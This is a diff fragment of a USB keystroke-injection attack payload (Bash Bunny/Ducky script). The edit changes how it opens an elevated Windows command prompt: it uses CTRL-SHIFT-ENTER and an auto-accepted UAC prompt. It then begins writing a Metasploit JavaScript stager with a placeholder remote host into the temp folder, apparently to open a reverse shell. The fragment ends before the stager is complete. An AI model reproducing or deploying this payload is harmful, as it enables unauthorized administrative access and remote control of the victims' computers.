@@ -17,19 +17,12 @@ ATTACKMODE HID STORAGE
 REM set keyboard
 DUCKY_LANG us
 REM open run menu
-Q GUI R
-Q DELAY 1000
-Q STRING runas /profile /user:%COMPUTERNAME%\Administrator "cmd"
-Q ENTER
-Q DELAY 2700
+Q CONTROL ESCAPE
+Q DELAY 200
+Q STRING cmd
+Q CTRL-SHIFT ENTER
+Q DELAY 2800
 Q ALT y
-Q DELAY 100
-Q BACKSPACE
-REM Q GUI r
-REM Q DELAY 1000
-REM launch command shell, obvious for testing
-REM Q STRING "cmd"
-REM Q ENTER
 REM Change IPADDR and PORT to match your system
 Q STRING "echo var RHOST = 'IPADDRESS'; > %temp%\BB-Metasploit-Winx64.js"
 Q ENTER
